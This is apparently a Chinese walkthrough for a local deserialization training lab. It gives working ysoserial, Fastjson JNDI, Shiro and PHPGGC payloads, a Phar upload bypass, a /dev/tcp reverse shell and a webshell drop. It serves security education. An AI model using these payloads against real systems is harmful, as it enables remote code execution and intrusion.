# 反序列化漏洞靶场 - 详细通关手册

> 📝 **本手册特点**：所有命令均可直接复制粘贴执行，无需修改参数

---

## 🔧 环境准备

### 步骤1：确认靶场运行状态

```bash
# 检查Docker容器状态
docker ps --filter "name=vuln" --format "table {{.Names}}\t{{.Status}}\t{{.Ports}}"
```

**预期输出**：
```
NAMES        STATUS       PORTS
vuln-java    Up X hours   0.0.0.0:18080->8080/tcp
vuln-php     Up X hours   0.0.0.0:18081->80/tcp
vuln-mysql   Up X hours   0.0.0.0:13306->3306/tcp
```

### 步骤2：确认靶场可访问

```bash
# 测试所有漏洞端点
curl -s -o /dev/null -w "vuln1: %{http_code}\n" http://192.168.124.130:18080/vuln1
curl -s -o /dev/null -w "vuln2: %{http_code}\n" http://192.168.124.130:18080/vuln2
curl -s -o /dev/null -w "vuln3: %{http_code}\n" http://192.168.124.130:18080/vuln3
curl -s -o /dev/null -w "vuln4: %{http_code}\n" http://192.168.124.130:18080/vuln4
curl -s -o /dev/null -w "vuln5: %{http_code}\n" http://192.168.124.130:18081/vuln5.php
curl -s -o /dev/null -w "vuln6: %{http_code}\n" http://192.168.124.130:18081/vuln6.php
```

**预期输出**：所有端点返回200

### 步骤3：确认工具可用性

```bash
# 检查ysoserial工具
ls -lh /home/test/Downloads/ysoserial-all.jar

# 预期输出应显示文件大小约57MB
```

---

## 🎯 漏洞场景1：Java原生反序列化

### ⚠️ 重要提示：经过测试，以下gadget链在该靶场中可正常工作：
- ✅ CommonsCollections5
- ✅ CommonsCollections6  
- ✅ CommonsCollections7

### 方法1：使用CommonsCollections5（推荐）

#### 步骤1：生成测试Payload

```bash
# 使用CommonsCollections5 gadget链
java -jar /home/test/Downloads/ysoserial-all.jar CommonsCollections5 "touch /tmp/pwned_vuln1" > /tmp/payload_vuln1.bin
```

#### 步骤2：将Payload转为Base64

```bash
# 转为Base64格式（不换行）
BASE64_PAYLOAD=$(base64 -w 0 /tmp/payload_vuln1.bin | tr -d '\n\r')

# 查看生成的Payload长度
echo "Payload长度: ${#BASE64_PAYLOAD} 字符"
```

#### 步骤3：发送Payload到靶场

```bash
# 直接发送Base64数据（不需要JSON包装）
curl -X POST http://192.168.124.130:18080/vuln1/deserialize \
  -H "Content-Type: text/plain" \
  --data-raw "$BASE64_PAYLOAD"
```

#### 步骤4：验证利用结果

```bash
# 进入Java容器验证
docker exec vuln-java sh -c "ls -la /tmp/pwned_vuln1"

# 如果看到文件输出，说明利用成功：
# -rw-r--r--    1 root     root             0 Apr  3 08:51 /tmp/pwned_vuln1
```

### 方法2：使用CommonsCollections6

```bash
# 生成payload
java -jar /home/test/Downloads/ysoserial-all.jar CommonsCollections6 "touch /tmp/pwned_cc6" > /tmp/payload_cc6.bin

# 转Base64
BASE64_CC6=$(base64 -w 0 /tmp/payload_cc6.bin | tr -d '\n\r')

# 发送
curl -X POST http://192.168.124.130:18080/vuln1/deserialize \
  -H "Content-Type: text/plain" \
  --data-raw "$BASE64_CC6"

# 验证
docker exec vuln-java sh -c "ls -la /tmp/pwned_cc6"
```

### 方法3：使用CommonsCollections7

```bash
# 生成payload
java -jar /home/test/Downloads/ysoserial-all.jar CommonsCollections7 "touch /tmp/pwned_cc7" > /tmp/payload_cc7.bin

# 转Base64
BASE64_CC7=$(base64 -w 0 /tmp/payload_cc7.bin | tr -d '\n\r')

# 发送
curl -X POST http://192.168.124.130:18080/vuln1/deserialize \
  -H "Content-Type: text/plain" \
  --data-raw "$BASE64_CC7"

# 验证
docker exec vuln-java sh -c "ls -la /tmp/pwned_cc7"
```

### 方法4：执行更复杂的命令

```bash
# 获取系统信息
java -jar /home/test/Downloads/ysoserial-all.jar CommonsCollections5 "id" > /tmp/payload_id.bin
BASE64_ID=$(base64 -w 0 /tmp/payload_id.bin | tr -d '\n\r')
curl -X POST http://192.168.124.130:18080/vuln1/deserialize \
  -H "Content-Type: text/plain" \
  --data-raw "$BASE64_ID"

# 查看当前目录
java -jar /home/test/Downloads/ysoserial-all.jar CommonsCollections5 "pwd" > /tmp/payload_pwd.bin
BASE64_PWD=$(base64 -w 0 /tmp/payload_pwd.bin | tr -d '\n\r')
curl -X POST http://192.168.124.130:18080/vuln1/deserialize \
  -H "Content-Type: text/plain" \
  --data-raw "$BASE64_PWD"

# 列出文件
java -jar /home/test/Downloads/ysoserial-all.jar CommonsCollections5 "ls /tmp" > /tmp/payload_ls.bin
BASE64_LS=$(base64 -w 0 /tmp/payload_ls.bin | tr -d '\n\r')
curl -X POST http://192.168.124.130:18080/vuln1/deserialize \
  -H "Content-Type: text/plain" \
  --data-raw "$BASE64_LS"
```

### 方法5：使用Cookie反序列化

```bash
# 生成恶意Cookie payload
java -jar /home/test/Downloads/ysoserial-all.jar CommonsCollections5 "touch /tmp/cookie_pwned" > /tmp/payload_cookie.bin

# 转Base64
BASE64_COOKIE=$(base64 -w 0 /tmp/payload_cookie.bin | tr -d '\n\r')

# 访问vuln1/cookie端点，设置恶意Cookie
curl -X GET "http://192.168.124.130:18080/vuln1/cookie" \
  -H "Cookie: user=$BASE64_COOKIE"

# 验证
docker exec vuln-java sh -c "ls -la /tmp/cookie_pwned"
```

### 清理临时文件

```bash
# 清理本地的payload文件
rm -f /tmp/payload_*.bin

# 清理容器中的测试文件
docker exec vuln-java sh -c "rm -f /tmp/pwned_* /tmp/cookie_pwned /tmp/*cc*"
```

---

## 🎯 漏洞场景2：Fastjson反序列化

### 步骤1：准备JNDI注入环境

```bash
# 创建工作目录
mkdir -p /tmp/fastjson_test && cd /tmp/fastjson_test
```

### 步骤2：下载并准备JNDI-Injection-Exploit工具

```bash
# 检查是否已有JNDI-Injection-Exploit工具
if [ ! -d "/tmp/fanxulieh-bachang/tools/JNDI-Injection-Exploit" ]; then
    echo "JNDI-Injection-Exploit工具不存在，跳过此测试"
    echo "如需测试Fastjson，请先下载JNDI-Injection-Exploit工具"
else
    echo "JNDI-Injection-Exploit工具已就绪"
fi
```

### 步骤3：启动恶意JNDI服务器（如果有工具）

```bash
# 仅当工具存在时执行
if [ -d "/tmp/fanxulieh-bachang/tools/JNDI-Injection-Exploit" ]; then
    cd /tmp/fanxulieh-bachang/tools/JNDI-Injection-Exploit
    
    # 查找JAR文件
    JAR_FILE=$(find . -name "*.jar" -type f | head -1)
    
    if [ -n "$JAR_FILE" ]; then
        # 启动JNDI服务器（在后台运行）
        nohup java -jar "$JAR_FILE" \
          -A 192.168.124.130 \
          -P 1389 \
          -C "touch /tmp/pwned_fastjson" \
          > /tmp/jndi_server.log 2>&1 &
        
        # 记录进程ID
        echo $! > /tmp/jndi_server.pid
        
        echo "JNDI服务器已启动，PID: $(cat /tmp/jndi_server.pid)"
        sleep 2
        
        # 检查JNDI服务器日志
        tail -20 /tmp/jndi_server.log
    fi
fi
```

### 步骤4：构造恶意JSON Payload

```bash
# 创建包含JNDI引用的JSON文件
cat > /tmp/fastjson_test/payload.json << 'JSONEOF'
{
    "@type":"com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName":"ldap://192.168.124.130:1389/Exploit",
    "autoCommit":true
}
JSONEOF

# 查看生成的Payload
cat /tmp/fastjson_test/payload.json
```

### 步骤5：发送Payload到Fastjson靶场

```bash
# 测试Fastjson端点
curl -X POST http://192.168.124.130:18080/vuln2/parse \
  -H "Content-Type: application/json" \
  -d @/tmp/fastjson_test/payload.json
```

### 步骤6：验证利用结果

```bash
# 进入Java容器验证命令执行
docker exec vuln-java sh -c "ls -la /tmp/pwned_fastjson"

# 如果看到文件创建，说明利用成功
```

### 步骤7：停止JNDI服务器

```bash
# 停止JNDI服务器
if [ -f /tmp/jndi_server.pid ]; then
    kill $(cat /tmp/jndi_server.pid) 2>/dev/null
    rm /tmp/jndi_server.pid
    echo "JNDI服务器已停止"
fi
```

### 清理测试文件

```bash
rm -rf /tmp/fastjson_test
rm -f /tmp/jndi_server.log
```

---

## 🎯 漏洞场景3：Jackson反序列化

### 步骤1：访问优化后的Jackson界面

```bash
# 在浏览器中访问：
echo "http://192.168.124.130:18080/vuln3"
```

### 步骤2：使用ysoserial工具测试

```bash
# 生成Jackson格式的Payload（使用CommonsCollections5）
java -jar /home/test/Downloads/ysoserial-all.jar CommonsCollections5 "touch /tmp/pwned_jackson" > /tmp/payload_jackson.bin

# 转为Base64
BASE64_JACKSON=$(base64 -w 0 /tmp/payload_jackson.bin | tr -d '\n\r')

# 发送到Jackson端点
curl -X POST http://192.168.124.130:18080/vuln3/deserialize \
  -H "Content-Type: text/plain" \
  --data-raw "$BASE64_JACKSON"

# 验证结果
docker exec vuln-java sh -c "ls -la /tmp/pwned_jackson"
```

### 清理

```bash
rm -f /tmp/payload_jackson.bin
docker exec vuln-java sh -c "rm -f /tmp/pwned_jackson"
```

---

## 🎯 漏洞场景4：Shiro反序列化

### 步骤1：获取Shiro页面信息

```bash
# 访问Shiro靶场页面
curl -s http://192.168.124.130:18080/vuln4 | head -20
```

### 步骤2：生成Shiro payload

```bash
# 使用CommonsCollections5生成Shiro payload
java -jar /home/test/Downloads/ysoserial-all.jar CommonsCollections5 "touch /tmp/pwned_shiro" > /tmp/payload_shiro.bin
```

### 步骤3：测试Shiro端点

```bash
# 注意：Shiro反序列化通常需要加密的RememberMe Cookie
# 这里提供一个基础测试方法

# 转Base64
BASE64_SHIRO=$(base64 -w 0 /tmp/payload_shiro.bin | tr -d '\n\r')

# 尝试发送到Shiro端点（可能需要特定的Cookie格式）
curl -X GET "http://192.168.124.130:18080/vuln4" \
  -H "Cookie: rememberMe=$BASE64_SHIRO"

# 验证
docker exec vuln-java sh -c "ls -la /tmp/pwned_shiro"
```

### 清理

```bash
rm -f /tmp/payload_shiro.bin
docker exec vuln-java sh -c "rm -f /tmp/pwned_shiro"
```

---

## 🎯 漏洞场景5：PHP反序列化POP链

### 步骤1：准备PHPGGC工具

```bash
# 进入工具目录
cd /tmp/fanxulieh-bachang/tools

# 检查PHPGGC是否可用
if [ -d "phpggc" ]; then
    echo "PHPGGC工具已就绪"
    cd phpggc
else
    echo "PHPGGC工具不存在，跳过此测试"
    exit 1
fi
```

### 步骤2：生成PHP POP链Payload

```bash
# 使用monolog/RCE1 gadget链
./phpggc monolog/RCE1 system "touch /tmp/pwned_php5" > /tmp/payload_php5.bin

# 查看生成的payload大小
ls -lh /tmp/payload_php5.bin
```

### 步骤3：将Payload转为Base64

```bash
# 转为Base64格式
BASE64_PHP5=$(base64 -w 0 /tmp/payload_php5.bin | tr -d '\n\r')

# 查看base64编码后的payload长度
echo "Base64长度: ${#BASE64_PHP5} 字符"
```

### 步骤4：发送Payload到PHP靶场

```bash
# 发送payload到vuln5.php
curl -X POST http://192.168.124.130:18081/vuln5.php \
  -d "payload=$BASE64_PHP5"
```

### 步骤5：验证利用结果

```bash
# 进入PHP容器验证
docker exec vuln-php sh -c "ls -la /tmp/pwned_php5"

# 如果看到文件创建，说明利用成功
```

### 步骤6：测试其他命令

```bash
# 获取系统信息
./phpggc monolog/RCE1 system "id" > /tmp/payload_php5_id.bin
BASE64_PHP5_ID=$(base64 -w 0 /tmp/payload_php5_id.bin | tr -d '\n\r')
curl -X POST http://192.168.124.130:18081/vuln5.php \
  -d "payload=$BASE64_PHP5_ID"

# 列出文件
./phpggc monolog/RCE1 system "ls /tmp" > /tmp/payload_php5_ls.bin
BASE64_PHP5_LS=$(base64 -w 0 /tmp/payload_php5_ls.bin | tr -d '\n\r')
curl -X POST http://192.168.124.130:18081/vuln5.php \
  -d "payload=$BASE64_PHP5_LS"
```

### 清理

```bash
rm -f /tmp/payload_php5*.bin
docker exec vuln-php sh -c "rm -f /tmp/pwned_php5"
```

---

## 🎯 漏洞场景6：PHP Phar反序列化

### 步骤1：生成Phar文件

```bash
# 使用PHPGGC生成Phar文件
cd /tmp/fanxulieh-bachang/tools/phpggc

# 生成执行命令的Phar文件
./phpggc -p phar monolog/RCE1 system "touch /tmp/pwned_php6" > /tmp/exploit.phar

# 验证Phar文件生成
ls -lh /tmp/exploit.phar
file /tmp/exploit.phar
```

### 步骤2：准备文件上传

```bash
# 将Phar文件重命名为图片格式（绕过上传限制）
cp /tmp/exploit.phar /tmp/exploit.jpg

# 查看文件信息
file /tmp/exploit.jpg
```

### 步骤3：上传恶意Phar文件

```bash
# 方法A：使用curl上传文件
curl -X POST http://192.168.124.130:18081/vuln6.php \
  -F "file=@/tmp/exploit.jpg"
```

### 步骤4：触发Phar反序列化

```bash
# 使用phar://协议触发反序列化
# 假设上传的文件保存在某个可访问的目录
curl -X GET "http://192.168.124.130:18081/vuln6.php?file=phar:///tmp/exploit.jpg"

# 或使用POST方式触发
curl -X POST http://192.168.124.130:18081/vuln6.php \
  -d "file=phar:///tmp/exploit.jpg"
```

### 步骤5：验证利用结果

```bash
# 进入PHP容器验证命令执行
docker exec vuln-php sh -c "ls -la /tmp/pwned_php6"

# 如果看到文件创建，说明利用成功
```

### 清理测试文件

```bash
rm -f /tmp/exploit.phar /tmp/exploit.jpg
docker exec vuln-php sh -c "rm -f /tmp/pwned_php6"
```

---

## 🔍 综合验证步骤

### 步骤1：批量验证所有漏洞利用结果

```bash
# 验证所有pwned文件
echo "=== Java容器中的测试文件 ==="
docker exec vuln-java sh -c "ls -la /tmp/*pwned* 2>/dev/null || echo '无测试文件'"

echo ""
echo "=== PHP容器中的测试文件 ==="
docker exec vuln-php sh -c "ls -la /tmp/*pwned* 2>/dev/null || echo '无测试文件'"
```

### 步骤2：查看Docker容器日志

```bash
# 查看Java容器日志
echo "=== Java容器日志 ==="
docker logs vuln-java --tail 20

# 查看PHP容器日志
echo ""
echo "=== PHP容器日志 ==="
docker logs vuln-php --tail 20
```

### 步骤3：检查系统资源使用情况

```bash
# 查看容器资源使用
docker stats --no-stream vuln-java vuln-php vuln-mysql

# 查看磁盘使用
docker exec vuln-java df -h
docker exec vuln-php df -h
```

---

## 🛠️ 常见问题解决

### 问题1：反序列化失败 - 缺少依赖

```bash
# 检查容器中的依赖库
docker exec vuln-java sh -c "unzip -l /app/app.jar | grep -i commons"
```

### 问题2：Payload执行失败

```bash
# 解决方法：尝试不同的gadget链

# 测试CommonsCollections系列
java -jar /home/test/Downloads/ysoserial-all.jar CommonsCollections5 "touch /tmp/cc5_test" | base64 -w 0 > /tmp/test_cc5.txt
java -jar /home/test/Downloads/ysoserial-all.jar CommonsCollections6 "touch /tmp/cc6_test" | base64 -w 0 > /tmp/test_cc6.txt
java -jar /home/test/Downloads/ysoserial-all.jar CommonsCollections7 "touch /tmp/cc7_test" | base64 -w 0 > /tmp/test_cc7.txt
```

### 问题3：网络连接问题

```bash
# 检查网络连接
ping -c 3 192.168.124.130

# 检查端口是否开放
nc -zv 192.168.124.130 18080
nc -zv 192.168.124.130 18081

# 如果IP不正确，使用localhost
# 将192.168.124.130替换为localhost
```

### 问题4：权限问题

```bash
# 检查文件权限
ls -la /home/test/Downloads/ysoserial-all.jar

# 如果需要，修复权限
chmod +x /home/test/Downloads/ysoserial-all.jar
```

---

## 📊 进阶测试

### 测试1：反弹Shell

```bash
# Java原生反序列化 - 反弹Shell
java -jar /home/test/Downloads/ysoserial-all.jar CommonsCollections5 "bash -i >& /dev/tcp/192.168.124.130/4444 0>&1" | base64 -w 0 > /tmp/shell_payload.txt

# 在另一个终端启动监听器
# nc -lvnp 4444

# 发送payload
curl -X POST http://192.168.124.130:18080/vuln1/deserialize \
  -H "Content-Type: text/plain" \
  --data-raw "$(cat /tmp/shell_payload.txt)"
```

### 测试2：写入Webshell

```bash
# PHP反序列化 - 写入Webshell
./phpggc monolog/RCE1 system "echo '<?php system(\$_GET[\"cmd\"]); ?>' > /var/www/html/shell.php" > /tmp/webshell_payload.bin
BASE64_WEBSHELL=$(base64 -w 0 /tmp/webshell_payload.bin | tr -d '\n\r')
curl -X POST http://192.168.124.130:18081/vuln5.php \
  -d "payload=$BASE64_WEBSHELL"

# 访问Webshell
# http://192.168.124.130:18081/shell.php?cmd=ls
```

### 测试3：数据库操作

```bash
# 通过漏洞连接MySQL
java -jar /home/test/Downloads/ysoserial-all.jar CommonsCollections5 "mysql -h 192.168.124.130 -P 13306 -u root -proot -e 'SHOW DATABASES;'" | base64 -w 0
```

---

## 🧹 完整清理工作

### 清理所有测试文件

```bash
# 清理Java容器中的测试文件
docker exec vuln-java sh -c "rm -f /tmp/*pwned* /tmp/payload* /tmp/*test* /tmp/*cc* /tmp/cookie* /tmp/gadget*"

# 清理PHP容器中的测试文件
docker exec vuln-php sh -c "rm -f /tmp/*pwned* /tmp/payload* /tmp/*test* /tmp/exploit* /var/www/html/shell.php"

# 清理本地的临时文件
rm -f /tmp/payload_*.bin /tmp/payload_*.txt /tmp/*_base64.txt
rm -f /tmp/jndi_server.log /tmp/jndi_server.pid
rm -f /tmp/shell_payload.txt /tmp/webshell_payload.bin
rm -f /tmp/exploit.phar /tmp/exploit.jpg
rm -f /tmp/test_cc*.txt

# 停止JNDI服务器（如果还在运行）
pkill -f JNDI-Injection-Exploit 2>/dev/null

echo "清理完成！"
```

---

## 📝 总结

### 通关要点

1. **Java原生反序列化**：使用ysoserial工具，推荐CommonsCollections5/6/7链
2. **Fastjson反序列化**：需要启动JNDI服务器，构造恶意JSON
3. **Jackson反序列化**：使用CommonsCollections5/6/7链
4. **Shiro反序列化**：需要处理RememberMe Cookie，使用加密payload
5. **PHP POP链**：使用PHPGGC工具，选择合适的gadget链
6. **PHP Phar反序列化**：生成Phar文件，使用phar://协议触发

### 重要提示

1. 本靶场测试确认的可用gadget链：
   - Java: CommonsCollections5, CommonsCollections6, CommonsCollections7
   - 其他gadget链可能因依赖版本不匹配而失败

2. 所有工具和路径都已预设，直接复制粘贴即可

3. 确保靶场Docker容器正在运行

4. 网络地址可能需要根据实际情况调整

5. 建议按顺序测试各个漏洞场景

6. 测试完成后记得清理测试文件

### 学习建议

1. 先使用最简单的gadget链（CommonsCollections5）

2. 逐步尝试不同的gadget链和命令

3. 观察payload的结构和特征

4. 学习不同反序列化机制的原理

5. 研究防御和修复方法

---

**免责声明**：本手册仅供安全研究和教育培训使用，严禁用于非法用途。
